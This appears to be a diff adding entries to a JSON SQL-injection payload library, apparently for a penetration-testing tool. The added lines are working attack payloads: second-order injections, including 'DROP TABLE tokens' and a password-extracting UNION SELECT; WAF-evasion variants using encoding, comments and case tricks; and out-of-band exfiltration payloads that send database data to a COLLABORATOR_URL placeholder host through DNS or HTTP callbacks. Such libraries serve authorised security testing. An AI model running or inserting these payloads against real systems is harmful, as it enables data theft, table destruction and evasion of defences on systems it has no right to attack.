@@ -115,7 +115,36 @@
         {"payload": "admin'--", "description": "Username with comment to bypass password check on re-use", "waf_bypass": false},
         {"payload": "' OR '1'='1", "description": "Classic OR bypass stored for later query injection", "waf_bypass": false},
         {"payload": "test' UNION SELECT 1--", "description": "UNION SELECT stored for second-order execution", "waf_bypass": false},
-        {"payload": "admin'/*", "description": "Username with block comment for stored injection", "waf_bypass": false}
+        {"payload": "admin'/*", "description": "Username with block comment for stored injection", "waf_bypass": false},
+        {"payload": "admin' AND 1=1--", "description": "Username registration with boolean SQLi — triggers on profile display or admin dashboard query", "waf_bypass": false},
+        {"payload": "test'); DROP TABLE tokens;--", "description": "Destructive second-order via profile field — executes when value is used in unparameterized INSERT/UPDATE", "waf_bypass": false},
+        {"payload": "user@evil.com' UNION SELECT password FROM users WHERE '1'='1", "description": "Email field stored injection — triggers when email is used in later notification or export query", "waf_bypass": false}
+      ]
+    },
+    "waf_bypass": {
+      "description": "SQL injection WAF evasion payloads using encoding, comments, and obfuscation techniques",
+      "payloads": [
+        {"payload": "/*!50000SELECT*/ /*!50000NULL*/,/*!50000NULL*/--", "description": "MySQL version comments — executes only on MySQL >= 5.0, invisible to many WAFs", "waf_bypass": true},
+        {"payload": "1' UniOn SeLeCt NULL,NULL--", "description": "Mixed case keywords — bypasses case-sensitive WAF rules", "waf_bypass": true},
+        {"payload": "1'\t\tUNION\t\tSELECT\t\tNULL--", "description": "Tab whitespace substitution — replaces spaces with tabs to evade space-based pattern matching", "waf_bypass": true},
+        {"payload": "1'%0aUNION%0aSELECT%0aNULL--", "description": "Newline whitespace substitution — URL-encoded newlines between keywords", "waf_bypass": true},
+        {"payload": "1' UN%49ON SEL%45CT NULL--", "description": "URL-encoded characters within keywords — some WAFs decode before matching, some don't", "waf_bypass": true},
+        {"payload": "1' UNION SELECT 1e0FROM users--", "description": "Scientific notation as separator — 1e0FROM is parsed as number then keyword by SQL engine", "waf_bypass": true},
+        {"payload": "1' AND 'ad'||'min'=(SELECT username FROM users LIMIT 1)--", "description": "String concatenation — splits blocked keywords like 'admin' across concat operators", "waf_bypass": true},
+        {"payload": "1' AND username=CHAR(97,100,109,105,110)--", "description": "CHAR() function — constructs strings from ASCII codes to avoid keyword detection", "waf_bypass": true},
+        {"payload": "1'/**/UNION/**/ALL/**/SELECT/**/NULL,NULL--", "description": "Inline comments between every keyword — maximally fragmented query", "waf_bypass": true},
+        {"payload": "1' /*!UNION*/ /*!SELECT*/ NULL,NULL /*!FROM*/ /*!information_schema.tables*/--", "description": "MySQL conditional comments wrapping each keyword — invisible to non-MySQL WAF parsers", "waf_bypass": true}
+      ]
+    },
+    "oob_exfil": {
+      "description": "Out-of-band data exfiltration payloads using DNS or HTTP callbacks per database engine",
+      "payloads": [
+        {"payload": "1' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.COLLABORATOR_URL\\\\a'))--", "description": "MySQL LOAD_FILE UNC path — exfils version() via DNS lookup to attacker domain (Windows only)", "waf_bypass": false},
+        {"payload": "1'; EXEC master..xp_dirtree '\\\\COLLABORATOR_URL\\a'--", "description": "MSSQL xp_dirtree — triggers DNS lookup to attacker-controlled domain for blind confirmation", "waf_bypass": false},
+        {"payload": "1' AND 1=UTL_HTTP.REQUEST('http://COLLABORATOR_URL/'||(SELECT user FROM dual))--", "description": "Oracle UTL_HTTP.REQUEST — HTTP callback exfiltrating current user (requires ACL permission)", "waf_bypass": false},
+        {"payload": "1'; SELECT dblink_send_query('host=COLLABORATOR_URL dbname=x','SELECT version()')--", "description": "PostgreSQL dblink — sends query result via outbound connection to attacker host", "waf_bypass": false},
+        {"payload": "1'; EXEC master..xp_subdirs '\\\\COLLABORATOR_URL\\a'--", "description": "MSSQL xp_subdirs — alternative to xp_dirtree for DNS exfiltration", "waf_bypass": false},
+        {"payload": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT LOAD_FILE(CONCAT('\\\\\\\\',database(),'.COLLABORATOR_URL\\\\')))))--", "description": "MySQL combined error-based + OOB — error reveals data while DNS confirms execution", "waf_bypass": false}
       ]
     }
   }
